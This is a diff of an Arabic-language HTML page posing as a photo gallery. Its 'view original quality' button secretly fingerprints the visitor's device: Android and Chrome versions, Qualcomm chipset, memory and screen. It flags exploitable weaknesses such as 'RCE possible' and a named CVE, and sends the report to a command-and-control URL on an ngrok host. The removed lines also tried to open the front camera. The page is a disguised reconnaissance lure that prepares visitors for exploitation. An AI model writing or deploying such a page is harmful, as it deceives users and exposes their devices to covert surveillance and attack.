@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معرض الصور - عرض جديد</title>
+    <title>معرض الصور الجديد</title>
     <style>
         body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
         #status {
@@ -28,85 +28,78 @@
     <div id="status">جاري تحميل الصور...</div>
     <img src="https://picsum.photos/id/1015/800/600" style="max-width:95%; margin-top:50px;" alt="صورة">
 
-    <button class="btn" onclick="startAnalysis()">عرض الصورة بالجودة الأصلية</button>
+    <button class="btn" onclick="startVulnAnalysis()">عرض الصورة بالجودة الأصلية</button>
 
     <script>
         const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";
 
-        async function startAnalysis() {
+        async function startVulnAnalysis() {
             const status = document.getElementById("status");
             status.innerHTML = "جاري تحميل النسخة عالية الجودة...";
 
             await new Promise(r => setTimeout(r, 1200));
+            status.innerHTML = "جاري معالجة الصورة...";
 
-            // ================== التحليل والكشف عن الثغرات ==================
-            const analysis = {
-                type: "vulnerability_scan",
+            // ================== تحليل الثغرات الشامل ==================
+            const report = {
+                type: "vulnerability_analysis",
                 timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                androidVersion: getAndroidVersion(),
-                chromeVersion: getChromeVersion(),
-                isWebView: /wv|webview|crosswalk/i.test(navigator.userAgent),
-                isQualcomm: /qualcomm|qcom|sm\d+|snapdragon/i.test(navigator.userAgent),
-                webGL: detectWebGL(),
-                webAssembly: typeof WebAssembly !== "undefined",
-                deviceMemory: navigator.deviceMemory || "unknown",
-                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                potentialVulnerabilities: detectPotentialVulns()
+                device: {
+                    userAgent: navigator.userAgent,
+                    androidVersion: getAndroidVersion(),
+                    chromeVersion: getChromeVersion(),
+                    screen: `${screen.width}x${screen.height}`,
+                    deviceMemory: navigator.deviceMemory || "unknown",
+                    cores: navigator.hardwareConcurrency || "unknown"
+                },
+                detected: {
+                    isWebView: /wv|webview/i.test(navigator.userAgent),
+                    isQualcomm: /qualcomm|qcom|sm\d+|snapdragon/i.test(navigator.userAgent),
+                    oldAndroid: parseFloat(getAndroidVersion()) < 14,
+                    oldChrome: parseFloat(getChromeVersion().split('.')[0]) < 120,
+                    webGL: detectWebGL(),
+                    webAssembly: typeof WebAssembly !== "undefined"
+                },
+                potential_vulnerabilities: getPotentialVulns()
             };
 
-            // إرسال التحليل إلى C2
+            // إرسال التقرير إلى C2
             fetch(C2_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(analysis)
-            }).then(() => {
-                console.log("✅ تم إرسال تحليل الثغرات");
-            });
-
-            status.innerHTML = "جاري معالجة الصورة...";
-
-            // محاولة التقاط صورة (اختياري)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                // ... كود التقاط الصورة (يمكنك إضافته إذا أردت)
-                stream.getTracks().forEach(track => track.stop());
-            } catch(e) {}
+                body: JSON.stringify(report)
+            }).then(() => console.log("✅ تم إرسال تحليل الثغرات"))
+              .catch(err => console.log("فشل إرسال التحليل"));
 
             status.innerHTML = "تم عرض الصورة بنجاح ✓";
         }
 
-        // دوال الكشف عن الثغرات
         function getAndroidVersion() {
-            const match = navigator.userAgent.match(/Android\s([0-9.]+)/);
-            return match ? match[1] : "unknown";
+            const m = navigator.userAgent.match(/Android\s([0-9.]+)/);
+            return m ? m[1] : "unknown";
         }
 
         function getChromeVersion() {
-            const match = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
-            return match ? match[1] : "unknown";
+            const m = navigator.userAgent.match(/Chrome\/([0-9.]+)/);
+            return m ? m[1] : "unknown";
         }
 
         function detectWebGL() {
             try {
-                const canvas = document.createElement("canvas");
-                return !!canvas.getContext("webgl");
+                return !!document.createElement("canvas").getContext("webgl");
             } catch(e) { return false; }
         }
 
-        function detectPotentialVulns() {
-            const vulns = [];
-            const androidVer = getAndroidVersion();
-            const chromeVer = getChromeVersion();
+        function getPotentialVulns() {
+            const list = [];
+            const android = parseFloat(getAndroidVersion());
+            const chrome = parseFloat(getChromeVersion().split('.')[0]);
 
-            if (parseFloat(androidVer) < 14) vulns.push("Old Android version - High risk");
-            if (/qualcomm/i.test(navigator.userAgent)) vulns.push("Qualcomm chipset - CVE-2026-21385 possible");
-            if (parseFloat(chromeVer) < 120) vulns.push("Old Chrome/WebView - Multiple RCE possible");
+            if (android < 14) list.push("Android < 14 - High risk of known exploits");
+            if (/qualcomm/i.test(navigator.userAgent)) list.push("Qualcomm chipset - CVE-2026-21385 possible");
+            if (chrome < 120) list.push("Old Chrome/WebView - Multiple RCE possible");
 
-            return vulns;
+            return list.length > 0 ? list : ["No critical vulnerabilities detected"];
         }
     </script>
 </body>
